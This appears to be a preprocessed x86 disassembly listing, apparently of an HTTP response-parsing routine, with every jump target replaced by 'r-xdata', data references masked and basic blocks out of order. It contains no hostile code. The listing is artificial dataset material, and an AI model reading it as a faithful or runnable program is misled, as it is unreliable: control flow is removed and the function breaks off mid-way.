push ecx
push edx
push eax
call sub_40aa00
add esp 0x10
cmp eax 0x3e8
jle r-xdata
mov ecx [ ebp + 0x140 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x170 ]
mov [ eax ] ecx
mov edx [ ebp + 0x174 ]
mov [ eax + 0x4 ] edx
mov esi [ esp + 0x10 ]
cmp [ ebp + 0x178 ] edi
jne r-xdata
mov [ esp + 0x28 ] eax
jg r-xdata
mov eax [ ebp + 0x604 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x180 ]
mov eax [ ebp + 0x17c ]
mov ecx [ ebp + 0x188 ]
push edx
mov edx [ ebp + 0x184 ]
push eax
push ecx
push edx
call sub_40aa00
mov ecx eax
mov eax 0x10624dd3
imul ecx
sar edx 0x6
mov eax edx
add esp 0x10
shr eax 0x1f
add edx eax
mov eax [ esi + 0x88 ]
cmp edx eax
jl r-xdata
mov ecx [ ebp + 0x2f8 ]
lea esi [ ebp + 0x2f8 ]
xor eax eax
mov [ ebp + 0x1d0 ] 0x0
test ecx ecx
jbe r-xdata
mov eax [ ebp + 0x178 ]
cdq
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov ecx [ ebp + 0x610 ]
mov edx [ ebp + 0x614 ]
lea eax [ esp + 0x24 ]
push eax
mov eax [ ebp + 0x13c ]
push ecx
push edx
push eax
push ebp
call sub_4040d0
add esp 0x14
cmp eax edi
jne r-xdata
mov ecx [ ebp + 0x1e4 ]
mov [ ebp + 0x614 ] ecx
mov cl [ ebp + 0x608 ]
test cl cl
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x4
push esi
call sub_40ab10
add esp 0x8
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x228
retn
mov ecx [ ebp + 0x170 ]
mov eax [ ebp + 0x174 ]
or ecx eax
jne r-xdata
mov eax [ esp + 0x240 ]
sete dl
mov [ eax ] dl
xor eax eax
mov al [ ebp + 0x113 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1c
pop ebx
add esp 0x228
retn
cmp eax ecx
jne r-xdata
mov edi [ ebp + 0x13c ]
lea edx [ ebp + 0x2fc ]
mov eax [ ebp + 0x610 ]
mov ecx [ esp + 0x24 ]
cmp eax ecx
je r-xdata
mov [ esp + 0x18 ] edi
mov cl [ ebp + 0x1d1 ]
test cl cl
je r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ ebp + 0x610 ]
mov eax 0x2
or edx eax
cmp ecx edi
mov [ esp + 0x1c ] edx
jne r-xdata
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] 0x1
test eax eax
jle r-xdata
mov eax [ ebp + 0x178 ]
test eax eax
jne r-xdata
mov al [ ebp + 0x106 ]
test al al
je r-xdata
mov eax [ ebp + 0x130 ]
mov ecx [ ebp + 0x134 ]
mov edx eax
and edx ecx
cmp edx 0xffffffff
je r-xdata
mov eax [ ebp + 0x604 ]
lea edi [ ebp + 0x500 ]
mov ecx 0x41
or al 0x2
[ edi ] [ esi ]
mov esi [ esp + 0x10 ]
mov [ ebp + 0x604 ] eax
cmp ecx 0x40
jae r-xdata
inc eax
add edx 0x4
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x1e4 ]
mov [ ebp + 0x610 ] edi
mov [ ebp + 0x614 ] edx
mov al [ ebp + 0x608 ]
test al al
je r-xdata
sub eax ecx
mov [ ebp + 0x610 ] eax
mov eax [ ebp + 0x614 ]
add eax ecx
mov [ ebp + 0x614 ] eax
jmp r-xdata
call sub_40a9a0
mov [ ebp + 0x184 ] eax
mov eax [ esp + 0x1c ]
test eax eax
mov [ ebp + 0x188 ] edx
je r-xdata
push 0x4000
push ebp
call sub_408250
add esp 0x8
cmp eax edi
mov [ esp + 0x18 ] eax
jle r-xdata
mov edx [ ebp + 0x16c ]
cmp [ edx + 0x78 ] eax
je r-xdata
mov eax [ ebp + 0x604 ]
mov [ ebp + 0x3fc ] 0x0
and al 0xfe
mov [ ebp + 0x604 ] eax
mov ecx [ ebp + 0x1e0 ]
mov [ ecx + eax ] 0x0
mov cl [ ebp + 0x18c ]
mov eax [ ebp + 0x1e0 ]
test cl cl
mov [ ebp + 0x1a0 ] eax
je r-xdata
mov edx [ esp + 0x10 ]
push 0x4
push edx
call sub_40ab10
mov al [ ebp + 0x1d1 ]
add esp 0x8
test al al
je r-xdata
push ebp
call sub_40ad20
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp + 0x16c ]
mov eax [ ecx + 0x54 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x170 ]
cmp edx eax
jne r-xdata
mov ecx [ ebp + 0x13c ]
mov [ ebp + eax * 4 + 0x2fc ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
cmp [ edx ] edi
je r-xdata
mov ebx [ ebp + 0x178 ]
add ebx ecx
mov eax ebx
mov [ ebp + 0x178 ] ebx
cdq
push edx
push eax
push esi
call sub_40ac80
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x604 ]
mov [ ebp + 0x500 ] edi
and al 0xfd
mov [ ebp + 0x604 ] eax
mov eax [ ebp + 0x604 ]
mov [ ebp + 0x500 ] edi
and al 0xfd
mov [ ebp + 0x604 ] eax
jmp r-xdata
mov [ ebp + 0x610 ] eax
mov cl [ esi + 0xd9 ]
test cl cl
je r-xdata
lea esi [ ebp + 0x2f8 ]
lea edi [ ebp + 0x500 ]
mov ecx 0x41
mov [ ebp + 0x1d1 ] 0x0
mov [ esi ] 0x0
mov [ ebp + 0x1d0 ] 0x1
[ edi ] [ esi ]
mov ecx [ ebp + 0x604 ]
mov esi 0xfffffffd
and ecx esi
mov [ ebp + 0x604 ] ecx
call sub_40a9a0
mov [ ebp + 0x1c8 ] eax
mov eax [ esp + 0x1c ]
and eax esi
mov [ ebp + 0x1cc ] edx
mov [ esp + 0x1c ] eax
mov ecx [ esp + 0x18 ]
push 0xa
push eax
mov [ esp + 0x1f ] 0x0
mov [ ebp + 0x1a4 ] eax
call [ strchr@IAT ]
add esp 0x8
mov [ ebp + 0x1a8 ] eax
test eax eax
je r-xdata
call sub_40a9a0
mov [ ebp + 0x1c8 ] eax
mov [ ebp + 0x1cc ] edx
mov eax [ ebp + 0x604 ]
test eax eax
pop edi
pop esi
pop ebp
mov eax 0x2a
pop ebx
add esp 0x228
retn
pop edi
pop esi
pop ebp
mov eax 0x12
pop ebx
add esp 0x228
retn
mov eax [ ebp + 0x168 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x174 ]
cmp eax ecx
je r-xdata
cmp [ esi + 0x82e0 ] edi
jne r-xdata
mov al [ ebp + 0x18c ]
test al al
jne r-xdata
mov ecx [ ebp + 0x19c ]
mov edx [ esp + 0x18 ]
mov edi [ esp + 0x10 ]
lea eax [ edx + ecx ]
mov ecx [ edi + 0x2c0 ]
cmp eax ecx
jl r-xdata
mov eax [ ebp + 0x1a8 ]
mov edx [ ebp + 0x1a0 ]
mov ebx [ esp + 0x18 ]
mov esi eax
mov edi [ ebp + 0x1a4 ]
sub esi edx
inc esi
mov edx [ ebp + 0x19c ]
sub ebx esi
inc eax
mov [ ebp + 0x1a0 ] eax
sub eax edi
mov edi [ esp + 0x10 ]
mov [ esp + 0x18 ] ebx
mov ebx eax
mov ecx [ edi + 0x2c0 ]
lea eax [ ebx + edx ]
cmp eax ecx
jl r-xdata
pop edi
pop esi
pop ebp
mov eax 0x12
pop ebx
add esp 0x228
retn
xor edx edx
xor ecx ecx
cmp eax edi
jle r-xdata
push 0x8000
call [ malloc@IAT ]
mov [ esi + 0x82e0 ] eax
mov ecx [ esi + 0x82e0 ]
mov eax [ esp + 0x1c ]
add esp 0x4
cmp ecx edi
je r-xdata
test ecx ecx
jle r-xdata
mov ecx [ esp + 0x18 ]
mov esi [ ebp + 0x1a0 ]
mov edi [ ebp + 0x198 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x18 ]
mov edi [ ebp + 0x198 ]
mov esi [ ebp + 0x19c ]
mov edx [ ebp + 0x194 ]
add edi ecx
add esi ecx
test edx edx
mov [ ebp + 0x198 ] edi
mov [ ebp + 0x19c ] esi
mov eax esi
jne r-xdata
lea eax [ eax + eax * 2 ]
lea ebx [ ecx + ecx ]
cdq
sub eax edx
sar eax 0x1
cmp eax ebx
jle r-xdata
mov eax [ ebp + 0x1a4 ]
mov ecx [ ebp + 0x198 ]
push ebx
push eax
push ecx
call [ strncpy@IAT ]
mov edx [ ebp + 0x198 ]
mov ecx [ ebp + 0x19c ]
add edx ebx
add ecx ebx
mov eax edx
mov [ ebp + 0x198 ] edx
mov [ ebp + 0x19c ] ecx
add esp 0xc
mov [ eax ] 0x0
mov edx [ ebp + 0x198 ]
mov [ ebp + 0x1a8 ] edx
mov eax [ edi + 0x2bc ]
mov [ ebp + 0x1ac ] eax
mov eax [ ebp + 0x194 ]
test eax eax
jne r-xdata
lea eax [ eax + eax * 2 ]
add ecx ecx
cdq
sub eax edx
sar eax 0x1
cmp eax ecx
mov [ esp + 0x20 ] eax
jg r-xdata
cmp ecx eax
je r-xdata
mov eax [ ebp + 0x614 ]
mov al [ eax + edx ]
cmp al 0xa
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x228
retn
mov edi [ ebp + 0x1dc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x1a0 ]
test ebx ebx
je r-xdata
cmp eax 0x5
jle r-xdata
mov eax [ edi + 0x2bc ]
mov esi [ ebp + 0x198 ]
push ebx
push eax
sub esi eax
call [ realloc@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov ebx eax
mov eax [ ebp + 0x1ac ]
mov cl [ eax ]
cmp cl 0xa
je r-xdata
cmp [ ebp + 0x19c ] 0x5
jle r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x20 ]
mov edi [ ebp + 0x198 ]
push ecx
mov eax [ eax + 0x2bc ]
push eax
sub edi eax
call [ realloc@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0x20 ] ecx
mov [ esp + 0x18 ] ecx
mov edx [ esi + 0x82e0 ]
mov [ ebp + 0x614 ] edx
mov [ ebp + 0x610 ] ecx
mov ebx [ esi + 0x82e0 ]
mov [ ebx + ecx ] al
mov eax [ esi + 0x82e0 ]
inc ecx
mov [ eax + ecx - 0x1 ] 0xd
mov eax [ esi + 0x82e0 ]
mov [ eax + ecx ] 0xa
jmp r-xdata
inc edi
mov [ ebp + 0x1dc ] edi
mov al [ ebp + 0x106 ]
test al al
je r-xdata
test [ ebp + 0x8 ] 0x4
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x2bc ]
push ecx
push eax
call sub_408310
add esp 0x8
test al al
jne r-xdata
mov [ edi + 0x2bc ] eax
add eax esi
mov [ edi + 0x2c0 ] ebx
mov [ ebp + 0x198 ] eax
cmp cl 0xd
jne r-xdata
cmp cl 0xd
je r-xdata
mov ecx [ edi + 0x2bc ]
push ecx
push edi
call sub_408310
add esp 0x8
test al al
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x20 ]
mov [ ecx + 0x2bc ] eax
add eax edi
mov [ ecx + 0x2c0 ] edx
mov [ ebp + 0x198 ] eax
mov edi ecx
mov eax [ esp + 0x18 ]
inc edx
inc ecx
cmp edx eax
jl r-xdata
mov edi [ ebp + 0xc8 ]
mov esi [ ebp + 0xcc ]
cmp edi 0xffffffff
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
push ecx
push ebx
push ebp
call sub_40c7f0
add esp 0x10
test eax eax
jg r-xdata
mov eax [ ebp + 0x168 ]
test eax eax
je r-xdata
mov [ ebp + 0x18c ] al
mov [ ebp + 0x190 ] 0x2
mov eax [ ebp + 0x1ac ]
cmp [ eax ] 0xa
jne r-xdata
inc eax
mov [ ebp + 0x1ac ] eax
mov ecx [ ebp + 0x194 ]
test ecx ecx
lea edx [ ecx + 0x1 ]
mov [ ebp + 0x194 ] edx
jne r-xdata
mov ecx [ esp + 0x18 ]
mov [ ebp + 0x18c ] 0x0
test ecx ecx
je r-xdata
mov ebx [ ebp + 0x170 ]
mov eax ecx
cdq
add eax ebx
mov ebx [ ebp + 0x174 ]
adc edx ebx
cmp edx esi
jl r-xdata
cmp esi edi
je r-xdata
sub eax 0x4
pop edi
neg eax
sbb eax eax
pop esi
and eax 0x21
pop ebp
add eax 0x17
pop ebx
add esp 0x228
retn
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ edx + 0xec ]
test eax eax
je r-xdata
mov al [ ebp + 0x104 ]
test al al
jne r-xdata
cmp [ ebp + 0x1c0 ] 0x64
jne r-xdata
inc eax
mov [ ebp + 0x1ac ] eax
cmp [ ebp + 0x1c0 ] 0x1a0
je r-xdata
mov ebx [ sscanf@IAT ]
lea edi [ ebp + 0x1c0 ]
lea esi [ ebp + 0x1c4 ]
push edi
lea ecx [ esp + 0x28 ]
push esi
push ecx
push rw-data
push eax
call ebx
add esp 0x14
cmp eax 0x3
jne r-xdata
mov ecx esi
mov [ ebp + 0x190 ] 0x2
mov [ esp + 0x18 ] ecx
jmp r-xdata
mov [ ebp + 0x190 ] 0x1
jmp r-xdata
mov eax ecx
mov ecx [ ebp + 0x170 ]
cdq
add ecx eax
mov eax [ esp + 0x10 ]
mov [ ebp + 0x170 ] ecx
mov ebx [ ebp + 0x174 ]
adc ebx edx
mov [ ebp + 0x174 ] ebx
mov edx [ ebp + 0x170 ]
mov ecx ebx
push ecx
push edx
push eax
call sub_40ac60
mov al [ ebp + 0x106 ]
add esp 0xc
test al al
jne r-xdata
jg r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ ebp + 0x604 ]
mov [ ebp + 0x3fc ] 0x0
and al 0xfe
mov [ ebp + 0x604 ] eax
mov edx [ ebp + 0x88 ]
test edx edx
jne r-xdata
mov eax [ ebp + 0x604 ]
pop edi
and al 0xfe
mov [ ebp + 0x3fc ] 0x0
mov [ ebp + 0x604 ] eax
mov eax [ esp + 0x23c ]
pop esi
pop ebp
mov [ eax ] 0x1
xor eax eax
pop ebx
add esp 0x228
retn
mov [ ebp + 0x609 ] 0x1
mov [ ebp + 0x18c ] 0x0
mov al [ ebp + 0x1d0 ]
mov [ ebp + 0x18c ] 0x1
test al al
mov [ ebp + 0x194 ] 0x0
je r-xdata
mov edx [ ebp + 0x1ac ]
push 0xd
push edx
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x1ac ]
push 0xf
push eax
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x1ac ]
push edi
push rw-data
push eax
call ebx
add esp 0xc
mov [ esi ] 0xa
test eax eax
jne r-xdata
mov eax [ esp + 0x24 ]
lea edx [ eax + eax * 4 ]
mov eax [ esi ]
shl edx 0x1
add eax edx
mov [ esi ] eax
jmp r-xdata
mov al [ esp + 0x17 ]
test al al
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc8 ]
mov eax [ ebp + 0x170 ]
sub ecx eax
mov [ esp + 0x18 ] ecx
jns r-xdata
cmp eax edi
jb r-xdata
mov esi [ ebp + 0x1d8 ]
test esi esi
jle r-xdata
xor ebx ebx
mov eax [ ebp + 0x604 ]
mov [ ebp + 0x1d0 ] 0x0
and al 0xfd
xor ebx ebx
mov [ ebp + 0x604 ] eax
mov [ ebp + 0x500 ] ebx
jmp r-xdata
cmp [ ebp + 0x1c0 ] 0x1a1
jne r-xdata
mov ecx [ ebp + 0x2f8 ]
lea esi [ ebp + 0x2f8 ]
xor eax eax
mov [ ebp + 0x1d0 ] 0x0
test ecx ecx
jbe r-xdata
mov eax [ ebp + 0x1c4 ]
mov ebx 0xa
cmp eax ebx
jne r-xdata
mov esi [ ebp + 0x1ac ]
add esi 0xd
mov al [ esi ]
test al al
je r-xdata
mov ecx [ ebp + 0x1ac ]
push 0xa
add ecx 0xf
push 0x0
push ecx
call sub_40c9d0
mov ecx [ esp + 0x1c ]
add esp 0xc
mov esi [ ecx + 0x158 ]
mov ecx [ ecx + 0x15c ]
mov edi esi
or edi ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ edi ]
mov [ eax + 0x8310 ] ecx
mov cl [ eax + 0x168 ]
mov edx [ esi ]
test cl cl
mov [ eax + 0x8318 ] edx
je r-xdata
mov ecx [ ebp + 0x1ac ]
mov ebx [ esp + 0x10 ]
push ecx
push ebx
call sub_408310
add esp 0x8
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x190 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x190 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x604 ]
mov [ ebp + 0x3fc ] 0x0
and al 0xfe
mov [ ebp + 0x604 ] eax
xor ecx ecx
mov [ esp + 0x18 ] ecx
mov edx [ esp + 0x10 ]
mov edx [ edx + 0xf0 ]
test edx edx
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x16
pop ebx
add esp 0x228
retn
mov edi [ esp + 0x10 ]
mov ecx 0x2
mov al [ edi + 0x16b ]
test al al
je r-xdata
push ebp
call sub_40b490
add esp 0x4
test eax eax
jne r-xdata
cmp eax ecx
jne r-xdata
mov edi [ ebp + 0x13c ]
lea edx [ ebp + 0x2fc ]
mov edx [ ebp + 0x1ac ]
push rw-data
push rw-data
push edx
call sub_40b4f0
add esp 0xc
test al al
je r-xdata
mov al [ ebp + 0x107 ]
test al al
je r-xdata
mov ebx [ strchr@IAT ]
push 0xd
push esi
call ebx
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov edi [ _isctype@IAT ]
mov [ ebp + 0x130 ] eax
mov [ ebp + 0x134 ] edx
jmp r-xdata
cmp edx ecx
jg r-xdata
cmp [ esi ] 0xa
jne r-xdata
mov eax [ edi ]
cmp eax 0x190
jl r-xdata
mov [ ebp + 0x18c ] 0x0
jmp r-xdata
mov [ edi ] 0xc8
mov ecx [ ebx + 0x100 ]
xor edx edx
cmp ecx 0x1
setne dl
add edx 0xa
mov [ esi ] edx
mov eax [ esp + 0x28 ]
mov esi [ esp + 0x10 ]
mov al [ ebp + 0x609 ]
test al al
jne r-xdata
sub eax 0x2
je r-xdata
mov eax [ edi + 0x2bc ]
mov esi [ ebp + 0x1ac ]
sub esi eax
push esi
push eax
push ecx
push edi
call sub_404120
add esp 0x10
cmp eax ebx
mov [ esp + 0x28 ] eax
jne r-xdata
mov ecx 0x3
mov eax [ ebp + 0x604 ]
lea edi [ ebp + 0x500 ]
or al 0x2
mov ecx 0x41
mov [ ebp + 0x604 ] eax
[ edi ] [ esi ]
jmp r-xdata
cmp ecx 0x40
jae r-xdata
inc eax
add edx 0x4
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0x1ac ]
push rw-data
push rw-data
push eax
call sub_40b4f0
add esp 0xc
test al al
je r-xdata
mov [ ebp + 0x104 ] 0x1
jmp r-xdata
cmp [ ebp + 0x1c4 ] ebx
jne r-xdata
mov eax [ ebp + 0x1ac ]
push rw-data
push rw-data
push eax
call sub_40b4f0
add esp 0xc
test al al
je r-xdata
mov ebx [ _isctype@IAT ]
push 0xa
push esi
call ebx
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov ecx [ _pctype@IAT ]
movsx eax al
mov edx [ ecx ]
mov al [ edx + eax * 2 ]
and eax 0x8
movsx edx al
push 0x8
push edx
call edi
add esp 0x8
jmp r-xdata
mov esi [ esp + 0x10 ]
mov eax 0x2
mov cl [ esi + 0x16b ]
test cl cl
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x3f
pop ebx
add esp 0x228
retn
jl r-xdata
mov edi [ edi ]
sub edi 0xcc
je r-xdata
mov [ ebp + 0x104 ] 0x1
cmp eax 0x191
je r-xdata
mov ecx [ esp + 0x18 ]
test eax eax
mov [ ebp + 0x190 ] 0x0
jne r-xdata
mov cl [ ebp + 0x609 ]
test cl cl
jne r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ ebp + 0x19c ]
push ecx
mov edx [ esi + 0x2bc ]
push edx
push 0x1
push esi
call sub_404120
add esp 0x10
jmp r-xdata
cmp esi edx
jg r-xdata
cmp esi edx
jl r-xdata
mov ecx [ edi + 0x8320 ]
add ecx esi
mov [ edi + 0x8320 ] ecx
mov eax [ ebp + 0x80 ]
add eax esi
xor ecx ecx
mov [ ebp + 0x80 ] eax
mov edx [ ebp + 0x1c0 ]
cmp edx 0x64
mov edx [ ebp + 0x90 ]
setne cl
dec ecx
and eax ecx
mov [ ebp + 0x84 ] eax
mov eax [ ebp + 0x94 ]
or edx eax
je r-xdata
mov edx [ ebp + 0x13c ]
mov [ ebp + eax * 4 + 0x2fc ] edx
mov eax [ esi ]
inc eax
mov [ esi ] eax
cmp [ edx ] edi
je r-xdata
mov ecx [ ebp + 0x1ac ]
push 0x11
push ecx
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
push ebp
mov [ ebp + 0x106 ] 0x1
call sub_40c7d0
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x1ac ]
push rw-data
push rw-data
push ecx
call sub_40b4f0
add esp 0xc
test al al
je r-xdata
mov [ ebp + 0x104 ] 0x0
jmp r-xdata
mov eax [ _pctype@IAT ]
movsx edx [ edi ]
mov ecx [ eax ]
mov al [ ecx + edx * 2 ]
and eax 0x8
movsx ecx [ edi ]
push 0x8
push ecx
call ebx
add esp 0x8
jmp r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
test eax eax
je r-xdata
mov edx [ ebp + 0x19c ]
mov ecx [ ebp + 0x1ac ]
push edx
push ecx
push eax
push esi
call sub_404120
add esp 0x10
mov [ esp + 0x28 ] eax
test eax eax
jne r-xdata
mov eax 0x3
cmp eax esi
ja r-xdata
xor eax eax
mov [ ebp + 0x130 ] eax
mov [ ebp + 0xc8 ] eax
mov [ ebp + 0x134 ] eax
mov [ ebp + 0xcc ] eax
sub edi 0x64
je r-xdata
cmp eax 0x197
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ ebp + 0x1a0 ]
push eax
push ecx
push 0x1
push esi
call sub_404120
add esp 0x10
cmp [ ebp + 0x190 ] 0x2
jge r-xdata
mov edx [ esp + 0x240 ]
pop edi
pop esi
pop ebp
mov [ edx ] 0x1
xor eax eax
pop ebx
add esp 0x228
retn
mov ecx [ esp + 0x240 ]
pop edi
pop esi
pop ebp
mov [ ecx ] 0x1
xor eax eax
pop ebx
add esp 0x228
retn
jmp r-xdata
mov al [ ebp + 0x18c ]
test al al
je r-xdata
mov al [ ebp + 0x1b0 ]
test al al
jne r-xdata
mov eax [ ebp + 0x1ac ]
push rw-data
push rw-data
push eax
call sub_40b4f0
add esp 0xc
test al al
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ edx + 0x58 ]
test eax eax
je r-xdata
mov [ ebp + 0x104 ] 0x0
jmp r-xdata
mov edx [ esp + 0x10 ]
sub edi esi
inc edi
mov eax [ edx + 0x8330 ]
mov ebx edi
push eax
call sub_405760
lea ecx [ ebx + 0x1 ]
push ecx
call [ malloc@IAT ]
mov edx [ esp + 0x18 ]
add esp 0x8
test eax eax
mov [ edx + 0x8330 ] eax
je r-xdata
cmp edi esi
jbe r-xdata
test eax eax
je r-xdata
mov ecx [ __mb_cur_max@IAT ]
cmp [ ecx ] 0x1
jle r-xdata
mov edx [ ebp + 0x19c ]
mov edi [ esi + 0x8320 ]
add edi edx
mov [ esi + 0x8320 ] edi
mov eax [ ebp + 0x19c ]
mov ecx [ ebp + 0x80 ]
add ecx eax
mov [ ebp + 0x80 ] ecx
mov ecx [ esi + 0x2bc ]
mov [ ebp + 0x198 ] ecx
mov [ ebp + 0x19c ] 0x0
jmp r-xdata
sub edi 0x70
jne r-xdata
mov al [ ebp + 0x113 ]
test al al
je r-xdata
mov eax [ edi + 0x2bc ]
mov [ ebp + 0x19c ] ebx
mov [ ebp + 0x198 ] eax
mov al [ esp + 0x17 ]
test al al
jne r-xdata
cmp [ edi + 0xf8 ] 0x1
jne r-xdata
mov eax [ ebp + 0x1c0 ]
cmp eax 0x12c
jl r-xdata
mov ecx [ ebp + 0x1ac ]
push rw-data
push ecx
call [ strstr@IAT ]
mov cl [ eax + 0x5 ]
add eax 0x5
add esp 0x8
cmp cl 0x3a
jne r-xdata
mov esi [ ebp + 0x1ac ]
add esi 0x11
mov al [ esi ]
test al al
je r-xdata
mov ecx ebx
mov edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
mov edx [ ecx + 0x8330 ]
mov [ edx + ebx ] 0x0
jmp r-xdata
dec edi
jmp r-xdata
mov eax [ ebp + 0x1a0 ]
cmp [ eax ] 0x0
je r-xdata
mov al [ ebp + 0x106 ]
test al al
je r-xdata
mov [ esp + 0x17 ] 0x1
jmp r-xdata
cmp [ ebp + 0x1c0 ] 0x1a0
jne r-xdata
cmp eax 0x190
jge r-xdata
push ebx
push 0x0
push eax
call sub_40c9d0
mov [ ebp + 0x1b8 ] eax
mov [ ebp + 0x1bc ] edx
mov edx [ ebp + 0x90 ]
mov eax [ ebp + 0x1b8 ]
add esp 0xc
cmp edx eax
jne r-xdata
inc eax
push 0x8
push esi
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
mov edi [ _isctype@IAT ]
mov eax [ __mb_cur_max@IAT ]
cmp [ eax ] 0x1
jle r-xdata
push 0xa
push eax
mov [ ebp + 0x1a4 ] eax
call [ strchr@IAT ]
add esp 0x8
mov [ ebp + 0x1a8 ] eax
test eax eax
jne r-xdata
mov eax [ ebp + 0x130 ]
mov ecx [ ebp + 0x134 ]
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
mov [ ebp + 0x130 ] eax
mov [ ebp + 0x134 ] eax
pop edi
pop esi
pop ebp
mov eax 0x21
pop ebx
add esp 0x228
retn
mov [ esp + 0x17 ] 0x1
mov ecx [ ebp + 0x1ac ]
push 0x9
push ecx
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x94 ]
mov ecx [ ebp + 0x1bc ]
cmp eax ecx
jne r-xdata
push 0x7
push esi
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
mov [ ebp + 0x1d4 ] 0x0
jmp r-xdata
mov ecx [ _pctype@IAT ]
movsx eax al
mov edx [ ecx ]
mov al [ edx + eax * 2 ]
and eax 0x8
movsx edx al
push 0x8
push edx
call edi
add esp 0x8
jmp r-xdata
push ecx
push eax
push edi
call sub_40aca0
mov edx [ ebp + 0x130 ]
mov eax [ ebp + 0x134 ]
mov [ ebp + 0xc8 ] edx
add esp 0xc
mov [ ebp + 0xcc ] eax
cmp ecx eax
je r-xdata
mov edx [ esp + 0x10 ]
mov al [ edx + 0x169 ]
test al al
je r-xdata
mov [ ebp + 0x1b0 ] 0x1
jmp r-xdata
push 0x4
push esi
push rw-data
call sub_40a880
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp + 0x1d4 ] 0x1
jmp r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
test eax eax
je r-xdata
mov al [ esp + 0x17 ]
test al al
je r-xdata
cmp [ ebp + 0xcc ] ebx
jne r-xdata
cmp [ ebp + 0xc8 ] ebx
jne r-xdata
mov edi [ ebp + 0x1ac ]
mov ebx [ _isctype@IAT ]
add edi 0x9
mov al [ edi ]
test al al
je r-xdata
mov [ ebp + 0x1d4 ] 0x2
jmp r-xdata
push 0x6
push esi
push rw-data
call sub_40a880
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ __mb_cur_max@IAT ]
cmp [ ecx ] 0x1
jle r-xdata
mov eax [ ebp + 0x604 ]
mov [ ebp + 0x3fc ] ebx
and al 0xfe
mov [ ebp + 0x604 ] eax
mov [ esp + 0x17 ] 0x1
jmp r-xdata
mov esi [ ebp + 0x1a8 ]
dec esi
cmp esi edi
jb r-xdata
mov ecx [ __mb_cur_max@IAT ]
cmp [ ecx ] 0x1
jle r-xdata
push 0x8
push esi
push rw-data
call sub_40a880
add esp 0xc
test eax eax
jne r-xdata
mov bl [ esi + 0x1 ]
inc esi
cmp esi edi
je r-xdata
mov eax [ __mb_cur_max@IAT ]
cmp [ eax ] 0x1
jle r-xdata
mov ecx [ _pctype@IAT ]
movsx eax al
mov edx [ ecx ]
mov al [ edx + eax * 2 ]
and eax 0x8
movsx edx al
push 0x8
push edx
call ebx
add esp 0x8
jmp r-xdata
mov [ ebp + 0x1d4 ] 0x3
jmp r-xdata
push ebx
push esi
push rw-data
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
push edi
mov [ esi ] 0x0
call [ _strdup@IAT ]
mov [ ebp + 0x168 ] eax
add esp 0x4
mov [ esi ] bl
mov eax [ _pctype@IAT ]
movsx edx [ esi ]
mov ecx [ eax ]
mov al [ ecx + edx * 2 ]
and eax 0x8
movsx ecx [ esi ]
push 0x8
push ecx
call ebx
add esp 0x8
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
test eax eax
je r-xdata
dec esi
cmp esi edi
jae r-xdata
test eax eax
je r-xdata
sub_408250
sub esp 0xc
mov eax [ esp + 0x14 ]
push ebx
mov ebx [ esp + 0x14 ]
push ebp
mov cl [ ebx + 0x10e ]
test cl cl
je r-xdata
mov ecx [ ebx + 0x61c ]
mov edx [ ebx + 0x614 ]
push ecx
push eax
push 0x1
push edx
call [ ebx + 0x618 ]
mov ebp eax
mov al [ ebx + 0x110 ]
add esp 0x10
test al al
